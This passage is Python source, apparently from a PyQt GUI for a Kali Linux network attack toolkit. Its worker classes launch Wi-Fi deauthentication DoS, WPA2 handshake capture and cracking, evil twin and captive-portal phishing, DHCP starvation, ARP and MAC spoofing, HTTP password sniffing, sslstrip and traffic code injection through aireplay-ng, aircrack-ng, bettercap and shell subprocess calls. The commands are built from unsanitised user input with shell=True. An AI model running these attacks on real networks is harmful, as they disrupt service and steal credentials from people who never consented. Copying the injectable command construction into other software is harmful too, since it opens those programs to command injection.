        self.handshake_snooper_log.append(progress_text)

    def report_handshake_snooper_log(self):
        self.handshake_snooper_status = 0
        self.handshake_snooper_button.setEnabled(True)
        self.handshake_snooper_button.setText("Start")

    def wifi_dos_button_clicked(self):
        if self.wifi_dos_status == 0 and not self.wifi_dos_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.wifi_dos_status == 0 and not self.check_wireless_interface(self.wifi_dos_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        
        elif self.wifi_dos_status == 0:
            # Get user input
            target_ap_bssid = self.wifi_dos_target_ap_bssid.text().replace(" ", "")
            channel = self.wifi_dos_channel.text().replace(" ", "")
            interface = self.wifi_dos_interface.text().replace(" ", "")
            client_mac_address = ""
            deauth_all_client = False
            if self.wifi_dos_deauth_all_client.isChecked():
                deauth_all_client = True
            else:
                client_mac_address = self.wifi_dos_client_mac.text().replace(" ", "")
            # Update GUI
            self.wifi_dos_button.setText("Stop")
            self.wifi_dos_status = 1
            self.wifi_dos_log.clear()

            # Initialize thread and worker
            self.wifi_dos_thread = QtCore.QThread()
            self.wifi_dos_worker = WifiDoSWorker(target_ap_bssid, channel, client_mac_address,
                                                 interface, deauth_all_client)
            self.initialize_threads_workers(self.wifi_dos_thread, self.wifi_dos_worker)
            self.wifi_dos_worker.progress.connect(self.report_wifi_dos_progress)
            self.wifi_dos_worker.finished.connect(self.report_wifi_dos_log)
            self.wifi_dos_thread.start()

        elif self.wifi_dos_status == 1:
            self.wifi_dos_button.setEnabled(False)
            current_time = datetime.now().strftime("%H:%M:%S")
            self.wifi_dos_worker.stop.emit()

    def report_wifi_dos_progress(self, progress_text):
        self.wifi_dos_log.append(progress_text)

    def report_wifi_dos_log(self):
        self.wifi_dos_status = 0
        self.wifi_dos_button.setEnabled(True)
        self.wifi_dos_button.setText("Start")

    def wpa2_cracker_button_clicked(self):
        if self.wpa2_cracker_status == 0:
            # Get user input
            wordlist = self.wpa2_cracker_wordlist.text().replace(" ", "")
            handshake = self.wpa2_cracker_handshake.text().replace(" ", "") 
            tool = self.wpa2_cracker_tool.currentText()
            # Update GUI
            self.wpa2_cracker_button.setText("Stop")
            self.wpa2_cracker_status = 1

            # Initialize thread and worker
            self.wpa2_cracker_thread = QtCore.QThread()
            self.wpa2_cracker_worker = WPA2CrackWorker(wordlist, handshake, tool)
            self.initialize_threads_workers(self.wpa2_cracker_thread, self.wpa2_cracker_worker)
            self.wpa2_cracker_worker.progress.connect(self.report_wpa2_cracker_progress)
            self.wpa2_cracker_worker.finished.connect(self.report_wpa2_cracker_log)
            self.wpa2_cracker_thread.start()

        elif self.wpa2_cracker_status == 1:
            self.wpa2_cracker_button.setEnabled(False)
            self.wpa2_cracker_worker.stop.emit()

    def report_wpa2_cracker_progress(self, progress_text):
        self.wpa2_cracker_log.append(progress_text)

    def report_wpa2_cracker_log(self):
        self.wpa2_cracker_status = 0
        self.wpa2_cracker_button.setEnabled(True)
        self.wpa2_cracker_button.setText("Start")

    def evil_twin_button_clicked(self):
        if self.evil_twin_status == 0 and not self.evil_twin_wireless_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your wireless interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.evil_twin_status == 0 and not self.check_wireless_interface(self.evil_twin_wireless_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Wireless Interface Device Not Found!")
            scanner_msg.exec()
        elif self.evil_twin_status == 0 and self.evil_twin_network_enable.isChecked() and not self.evil_twin_network_interface.text(): 
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.exec()
        elif self.evil_twin_status == 0 and self.evil_twin_network_enable.isChecked() and not self.check_interface(self.evil_twin_network_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Network Interface Device Not Found!")
            scanner_msg.exec()
        elif self.evil_twin_status == 0 and not self.evil_twin_ssid.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the SSID!")
            scanner_msg.exec()

        elif self.evil_twin_status == 0:
            # Get user input
            wireless_interface = self.evil_twin_wireless_interface.text().replace(" ", "")
            ssid = self.evil_twin_ssid.text().replace(" ", "") 
            attack_mode = self.evil_twin_attack_mode.currentText()
            network_interface = "emptynullnone"
            if self.evil_twin_network_enable.isChecked():
                network_interface = self.evil_twin_network_interface.text().replace(" ", "")
            login_page = self.evil_twin_login_page.currentText()
            # Update GUI
            self.evil_twin_button.setText("Stop")
            self.evil_twin_status = 1

            # Initialize thread and worker
            self.evil_twin_thread = QtCore.QThread()
            self.evil_twin_worker = EvilTwinWorker(wireless_interface, ssid, attack_mode, network_interface, login_page)
            self.initialize_threads_workers(self.evil_twin_thread, self.evil_twin_worker)
            self.evil_twin_worker.progress.connect(self.report_evil_twin_progress)
            self.evil_twin_worker.finished.connect(self.report_evil_twin_log)
            self.evil_twin_thread.start()

        elif self.evil_twin_status == 1:
            self.evil_twin_button.setEnabled(False)
            self.evil_twin_worker.stop.emit()
            subprocess.run("iptables --table nat --flush", shell=True)
            subprocess.run("iptables --delete-chain", shell=True)
            subprocess.run("iptables --table nat --delete-chain", shell=True)

    def report_evil_twin_progress(self, progress_text):
        self.evil_twin_log.append(progress_text)

    def report_evil_twin_log(self):
        self.evil_twin_status = 0
        self.evil_twin_log.append("[+] Evil Twin Attack is stopped")
        self.evil_twin_button.setEnabled(True)
        self.evil_twin_button.setText("Start")
    
    def evil_twin_clear_log_clicked(self):
        self.evil_twin_log.clear()

    def wireless_monitor_button_clicked(self):
        if not self.settings_wireless_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the network interface!")
            scanner_msg.exec()
        elif not self.check_wireless_interface(self.settings_wireless_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        else:
            # Get user input
            interface = self.settings_wireless_interface.text().replace(" ", "")
            subprocess.run(f"ifconfig {interface} down", shell=True)
            subprocess.check_output(f"iwconfig {interface} mode monitor", shell=True)
            subprocess.run(f"ifconfig {interface} up", shell=True)
            self.settings_log.append(f"[+] Interface {interface} monitor mode enabled")

    def wireless_managed_button_clicked(self):
        if not self.settings_wireless_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the network interface!")
            scanner_msg.exec()
        elif not self.check_wireless_interface(self.settings_wireless_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        else:
            # Get user input
            interface = self.settings_wireless_interface.text().replace(" ", "")
            subprocess.run(f"ifconfig {interface} down", shell=True)
            subprocess.run(f"iwconfig {interface} mode managed", shell=True)
            subprocess.run(f"ifconfig {interface} up", shell=True)
            self.settings_log.append(f"[+] Interface {interface} managed mode enabled")

    def network_manager_start_clicked(self):
        subprocess.run("service NetworkManager start", shell=True)
        self.settings_log.append(f"[+] NetworkManager is started")

    def network_manager_stop_clicked(self):
        subprocess.run("service NetworkManager stop", shell=True)
        self.settings_log.append(f"[+] NetworkManager is stopped")


class ScanWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal(list)
    progress = QtCore.pyqtSignal(int)

    def __init__(self, ip_address_range, interface, count):
        super(ScanWorker, self).__init__()
        self.ip_address_range = ip_address_range
        self.interface = interface
        self.count = count

    def run(self):
        # Initialize network scanner
        scanner = network_scanner.NetworkScanner(self.progress)
        scanner.set_ip_range(self.ip_address_range)
        scanner.set_interface(self.interface)
        scanner.set_count(self.count)
        # Scan
        results = scanner.scan()
        self.finished.emit(results)


class ARPSpoofWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, target, victims_list):
        super(ARPSpoofWorker, self).__init__()
        self.target = target
        self.victims_list = victims_list
        self.stop.connect(self.stop_spoofer)

    def run(self):
        # Initialize ARP spoofer
        self.spoofer = arp_spoofer.ARPSpoofer(self.target, self.victims_list, self.progress)
        # Run
        self.spoofer.run()
        self.finished.emit()

    def stop_spoofer(self):
        self.spoofer.set_stop()


class MACSpoofWorker(QtCore.QObject):
    progress = QtCore.pyqtSignal(str)
    finished = QtCore.pyqtSignal()

    def __init__(self, interface, new_mac, action):
        super(MACSpoofWorker, self).__init__()
        self.interface = interface
        self.action = action
        self.new_mac = new_mac

    def run(self):
        # Initilize MAC spoofer
        self.spoofer = mac_spoofer.MACSpoofer(self.interface, self.progress)
        # Get MAC or Spoof MAC
        if self.action == 1:
            self.spoofer.get_current_mac()
        elif self.action == 2:
            self.spoofer.change_mac(self.new_mac)
        self.finished.emit()


class DHCPStarvationWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, interface):
        super(DHCPStarvationWorker, self).__init__()
        self.interface = interface
        self.stop.connect(self.stop_attack)

    def run(self):
        self.dhcp_starvation_process = subprocess.Popen(
            f"python3 src/dhcp_starvation_attack.py -i {self.interface}",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=True,
            encoding='utf-8',
            errors='replace',
            preexec_fn=os.setsid
        )
        self.progress.emit("[+] DHCP Starvation Attack is started, "
                           "the attack will consume all IP addresses in a few seconds\n")
        # Obtain real time output from the attacker and print on GUI
        while True:
            realtime_output = self.dhcp_starvation_process.stdout.readline()
            if realtime_output == '' and self.dhcp_starvation_process.poll() is not None:
                break
            if realtime_output:
                self.progress.emit(realtime_output.strip())
        self.finished.emit()

    def stop_attack(self):
        # Kill subprocess
        os.killpg(os.getpgid(self.dhcp_starvation_process.pid), signal.SIGTERM)


class NetfilterqueueAttackWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, domains, file_location, injection_code, sslstrip):
        super(NetfilterqueueAttackWorker, self).__init__()
        self.domains, self.file_location, self.injection_code = "emptynullnone", "emptynullnone", "emptynullnone"
        if domains:
            self.domains = domains
        if file_location:
            self.file_location = file_location
        if injection_code:
            self.injection_code = injection_code
        self.sslstrip = sslstrip
        self.stop.connect(self.stop_attacker)

    def run(self):
        # If sslstrip is disabled
        if self.sslstrip == 0:
            self.attacker_process = subprocess.Popen(f'xterm -hold -T "Netfilterqueue Attack" -geometry 65x20+0+0 -fa '
                                                     f'"Monospace" -fs 10 -sb -rightbar -sk -e python3 '
                                                     f'src/netfilterqueue_attacks.py -d "{self.domains}" -l '
                                                     f'"{self.file_location}" -c "{self.injection_code}"',
                                                     shell=True, preexec_fn=os.setsid)
        # If sslstrip is enabled
        elif self.sslstrip == 1:
            self.attacker_process = subprocess.Popen(f'xterm -hold -T "Netfilterqueue Attack" -geometry 65x20+0+0 -fa '
                                                     f'"Monospace" -fs 10 -sb -rightbar -sk -e python3 '
                                                     f'src/netfilterqueue_attacks_sslstrip.py -d "{self.domains}" -l '
                                                     f'"{self.file_location}" -c "{self.injection_code}"',
                                                     shell=True, preexec_fn=os.setsid)

    def stop_attacker(self):
        # Kill subprocess
        os.killpg(os.getpgid(self.attacker_process.pid), signal.SIGTERM)
        self.finished.emit()


class PasswordSniffWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, interface):
        super(PasswordSniffWorker, self).__init__()
        self.interface = interface
        self.stop.connect(self.stop_sniffer)

    def run(self):
        self.password_sniffer_process = subprocess.Popen(
            f"python3 src/password_sniffer.py -i {self.interface}",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=True,
            encoding='utf-8',
            errors='replace',
            preexec_fn=os.setsid
        )
        self.progress.emit("[+] Password Sniffer is started, "
                           "HTTP requests will be sniffed and printed on the terminal...\n")
        # Obtain real time output from password sniffer and print on GUI
        while True:
            realtime_output = self.password_sniffer_process.stdout.readline()
            if realtime_output == '' and self.password_sniffer_process.poll() is not None:
                break
            if realtime_output:
                self.progress.emit(realtime_output.strip())
        self.finished.emit()

    def stop_sniffer(self):
        # Kill subprocess
        os.killpg(os.getpgid(self.password_sniffer_process.pid), signal.SIGTERM)


class PortScanWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, ip_address, scan_type):
        super(PortScanWorker, self).__init__()
        self.ip_address = ip_address
        self.scan_type = scan_type
        self.stop.connect(self.stop_scanner)

    def run(self):
        self.port_scanner_process = subprocess.Popen(f"python3 src/port_scanner.py -s '{self.scan_type}' -t "
                                                     f"{self.ip_address}", shell=True, preexec_fn=os.setsid,
                                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        self.progress.emit("[+] Performing port scan...\n")
        self.progress.emit(self.port_scanner_process.stdout.read().decode())
        self.finished.emit()

    def stop_scanner(self):
        os.killpg(os.getpgid(self.port_scanner_process.pid), signal.SIGTERM)


class SSLStripWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, interface):
        super(SSLStripWorker, self).__init__()
        self.interface = interface
        self.stop.connect(self.stop_sslstrip)

    def run(self):
        self.sslstrip_progress = subprocess.Popen(f"bettercap -iface {self.interface} -caplet hstshijack/yang_sslstrip",
                                                  shell=True, preexec_fn=os.setsid, stdout=subprocess.DEVNULL)
        current_time = datetime.now().strftime("%H:%M:%S")
        self.progress.emit(f"[+] {current_time}: sslstrip is running in the background...\n")

    def stop_sslstrip(self):
        os.killpg(os.getpgid(self.sslstrip_progress.pid), signal.SIGTERM)
        current_time = datetime.now().strftime("%H:%M:%S")
        self.progress.emit(f"[+] {current_time}: sslstrip is stopped...\n")
        self.finished.emit()


class WirelessNetworkScanWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, target_ap_bssid, interface, band):
        super(WirelessNetworkScanWorker, self).__init__()
        self.target_ap_bssid = target_ap_bssid
        self.interface = interface
        self.band = band
        self.stop.connect(self.stop_attacker)

    def run(self):
        self.progress.emit("[+] Initializing the scanner....")
        if self.target_ap_bssid:
            self.attacker_process = subprocess.Popen(
                f'xterm -hold -T "Wireless Network Scanner" -geometry 120x40+0+0 -fa "Monospace" '
                f'-fs 11 -sb -rightbar -sk -xrm "XTerm*selectToClipboard: true" -e airodump-ng '
                f'--bssid {self.target_ap_bssid} --band "{self.band}" '
                f'"{self.interface}"',
                shell=True, preexec_fn=os.setsid)
        else:
            self.attacker_process = subprocess.Popen(
                f'xterm -hold -T "Wireless Network Scanner" -geometry 120x40+0+0 -fa "Monospace" -fs 11 '
                f'-sb -rightbar -sk -xrm "XTerm*selectToClipboard: true" -e airodump-ng --band "{self.band}" '
                f'"{self.interface}"',
                shell=True, preexec_fn=os.setsid)
        self.progress.emit("[+] You can select the text on the terminal to copy it.")

    def stop_attacker(self):
        # Kill subprocess
        os.killpg(os.getpgid(self.attacker_process.pid), signal.SIGTERM)
        self.finished.emit()


class HandshakeSnoopWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, target_ap_bssid, channel, file_name, interface, attack_mode):
        super(HandshakeSnoopWorker, self).__init__()
        self.target_ap_bssid = target_ap_bssid
        self.channel = channel
        self.file_name = file_name
        self.interface = interface
        self.attack_mode = attack_mode

        self.deauth_on = True
        self.stop.connect(self.stop_snooper)

    def run(self):
        self.progress.emit("[+] Initializing Handshake Snooper....")
        self.progress.emit("[!] Handshake file will be stored in /opt/project/handshake/ directory")

        if self.attack_mode == "Passive":
            self.snooper_process = subprocess.Popen(
                f'xterm -hold -T "Handshake Snooper" -geometry 120x40+0+0 -fa "Monospace" -fs 10 '
                f'-sb -rightbar -e airodump-ng --bssid {self.target_ap_bssid} --channel {self.channel} '
                f'--write /opt/handshake/{self.file_name} {self.interface}',
                shell=True, preexec_fn=os.setsid)
            self.progress.emit("[!] Please stop the attack manually when the handshake is captured")

        elif self.attack_mode == "Aggressive":
            self.snooper_process = subprocess.Popen(
                f'xterm -hold -T "Handshake Snooper" -geometry 120x40+0+0 -fa "Monospace" -fs 10 '
                f'-sb -rightbar -e airodump-ng --bssid {self.target_ap_bssid} --channel {self.channel} '
                f'--write /opt/handshake/{self.file_name} {self.interface}',
                shell=True, preexec_fn=os.setsid)
            self.progress.emit("[!] Please stop the attack manually when the handshake is captured")
            self.progress.emit("[+] Aggressive mode enabled, initializing deauth attack\n")
            while self.deauth_on:
                time.sleep(3)
                self.progress.emit(f"[+] Deauth-ing all clients in {self.target_ap_bssid} network...")
                deauth_progress = subprocess.run(f"aireplay-ng --deauth 2 -a {self.target_ap_bssid} {self.interface}",
                                                 shell=True, stdout=subprocess.PIPE)
                self.progress.emit(deauth_progress.stdout.decode())
                self.progress.emit(f"[-] Deauth attack is paused, waiting target client to automatically "
                                   f"connect to the target AP")
                time.sleep(7)
            self.finished.emit()

    def stop_snooper(self):
        if self.attack_mode == "Aggressive":
            self.deauth_on = False
            self.progress.emit("[-] Deauth attack is stopped")
            self.progress.emit("[-] Please wait..")
        # Kill subprocess
        os.killpg(os.getpgid(self.snooper_process.pid), signal.SIGTERM)
        if self.attack_mode == "Passive":
            self.finished.emit()


class WifiDoSWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, target_ap_bssid, channel, client_mac_address, interface, deauth_all_client):
        super(WifiDoSWorker, self).__init__()
        self.target_ap_bssid = target_ap_bssid
        self.channel = channel
        self.client_mac_address = client_mac_address
        self.interface = interface
        self.deauth_all_client = deauth_all_client

        self.stop.connect(self.stop_attacker)

    def run(self):
        self.progress.emit("[+] Initializing Deauth Attack....")
        self.airodump_process = subprocess.Popen(f'airodump-ng --bssid {self.target_ap_bssid} --channel '
                                                 f'{self.channel} {self.interface}',
                                                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

        if not self.deauth_all_client:
            self.deauth_process = subprocess.Popen(
                f"aireplay-ng --deauth 0 -a {self.target_ap_bssid} "
                f"-c {self.client_mac_address} {self.interface}",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                encoding='utf-8',
                errors='replace',
                preexec_fn=os.setsid
            )

        elif self.deauth_all_client:
            self.deauth_process = subprocess.Popen(
                f"aireplay-ng --deauth 0 -a {self.target_ap_bssid} {self.interface}",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                encoding='utf-8',
                errors='replace',
                preexec_fn=os.setsid
            )
            self.progress.emit("[+] Deauth-ing all clients from the network...")
        try:
            # Obtain real time output from deauth process and print on GUI
            while True:
                realtime_output = self.deauth_process.stdout.readline()
                if realtime_output == '' and self.deauth_process.poll() is not None:
                    break
                if realtime_output:
                    self.progress.emit(realtime_output.strip())
        except ProcessLookupError:
            pass

    def stop_attacker(self):
        # Kill subprocess
        try:
            os.killpg(os.getpgid(self.deauth_process.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass
        try:
            os.killpg(os.getpgid(self.airodump_process.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass
        self.finished.emit()


class WPA2CrackWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, wordlist, file_name, tool):
        super(WPA2CrackWorker, self).__init__()
        self.wordlist = wordlist
        self.file_name = file_name
        self.tool = tool

        self.stop.connect(self.stop_cracker)

    def run(self):
        current_time = datetime.now().strftime("%H:%M:%S")
        self.progress.emit(f"[+] {current_time}: {self.tool} is chosen")
        self.progress.emit(f"[+] {current_time}: Initializing WPA/WPA2 Cracker....")

        if self.tool == "Aircrack-ng":
            self.cracker_process = subprocess.Popen(
                f'xterm -hold -T "WPA/WPA2 Cracker" -geometry 80x25+0+0 -fa "Monospace" -fs 10 '
                f'-sb -rightbar -e aircrack-ng -w {self.wordlist} {self.file_name} ',
                shell=True, preexec_fn=os.setsid)

    def stop_cracker(self):
        # Kill subprocess
        os.killpg(os.getpgid(self.cracker_process.pid), signal.SIGTERM)
        current_time = datetime.now().strftime("%H:%M:%S")
        self.progress.emit(f"[+] {current_time}: {self.tool} Cracker Stopped")
        self.finished.emit()


class EvilTwinWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal()
    progress = QtCore.pyqtSignal(str)
    stop = QtCore.pyqtSignal()

    def __init__(self, wireless_interface, ssid, attack_mode, network_interface, login_page):
        super(EvilTwinWorker, self).__init__()
        self.wireless_interface = wireless_interface
        self.ssid = ssid
        self.attack_mode = attack_mode
        self.network_interface = network_interface
        self.login_page = login_page

        self.stop.connect(self.stop_attacker)

    def run(self):
        current_time = datetime.now().strftime("%H:%M:%S")
        
        if self.attack_mode == "Fake Access Point":
            self.attacker = fake_access_point.FakeAccessPoint(self.wireless_interface, self.ssid, self.network_interface)
            self.progress.emit("[+] Initializing Fake Access Point...")
            self.attacker.run()
        elif self.attack_mode == "Captive Portal":
            self.progress.emit("[+] Initializing Captive Portal...")
            try:
                shutil.copyfile("src/captive_portal/000-default.conf", "/etc/apache2/sites-enabled/000-default.conf")
                subprocess.run("service apache2 restart", shell=True)
            except Exception as e:
                self.progress.emit("[-] Failed to setup Apache2 default configuration, are you using default Kali Linux?")
                print(e)
            self.attacker = captive_portal.CaptivePortal(self.wireless_interface, self.ssid, self.login_page)
            self.attacker.run()

    def stop_attacker(self):
        ## Kill subprocess
        #hostapd_pid = subprocess.check_output('ps -A | grep hostapd | cut -d " " -f 3', shell=True).decode().replace("\n", "")
        #dnsmasq_pid = subprocess.check_output('ps -A | grep dnsmasq | cut -d " " -f 3', shell=True).decode().replace("\n", "")
        #subprocess.run(f'kill -9 {hostapd_pid}', shell=True)
        #subprocess.run(f'kill -9 {dnsmasq_pid}', shell=True)
        if self.attack_mode == "Captive Portal":
            try:
                shutil.copyfile("src/captive_portal/apache_default_backup.conf", "/etc/apache2/sites-enabled/000-default.conf")
                self.progress.emit("[+] Stopping Captive Portal... Please enable NetworkManager in settings if you need it "
                                   "(NetworkManager might make your Wireless Adapter goes back to managed mode).")
            except Exception as e:
                self.progress.emit("[-] Failed to restore Apache2 default configuration, are you using default Kali Linux?")
                print(e)

        # os.killpg(os.getpgid(self.evil_twin_process.pid), signal.SIGTERM)
        current_time = datetime.now().strftime("%H:%M:%S")
        # self.progress.emit(f"[+] {current_time}: {self.tool} Cracker Stopped")
        self.attacker.stop()
        self.finished.emit()


if __name__ == "__main__":
    import sys

    app = QtWidgets.QApplication(sys.argv)

    ui = Ui_MainWindow()
    # Set app window geometry
    window_width = 1200
    window_height = 900
    screen = app.primaryScreen()
    size = screen.size()
    xpos = (size.width() - window_width) // 2
    ypos = (size.height() - window_height) // 2
    ui.setGeometry(xpos, ypos, window_width, window_height)

    ui.show()
    sys.exit(app.exec())
